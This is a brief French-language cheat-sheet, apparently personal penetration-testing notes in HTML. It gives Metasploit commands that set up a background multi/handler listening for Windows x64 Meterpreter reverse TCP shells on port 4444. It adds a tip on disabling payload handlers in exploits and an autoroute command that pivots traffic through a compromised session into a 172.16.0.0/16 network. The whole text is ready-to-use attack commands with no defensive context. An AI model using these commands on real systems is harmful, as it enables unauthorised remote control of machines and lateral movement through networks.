<h3>Set un handler</h3>
use exploit/multi/handler</br>
set PAYLOAD windows/x64/meterpreter/reverse_tcp</br>
set LHOST 0.0.0.0</br>
set LPORT 4444</br>
set ExitOnSession false</br>
exploit -j -z</br>

Ne pas oublier d'enlever les handlers des exploits:</br>
set disablepayloadhandler true</br>

<h3>Pivoter</h3>
<i>run autoroute -s 172.16.0.0/16</i> → Route le trafic à travers la session ouverte</br>

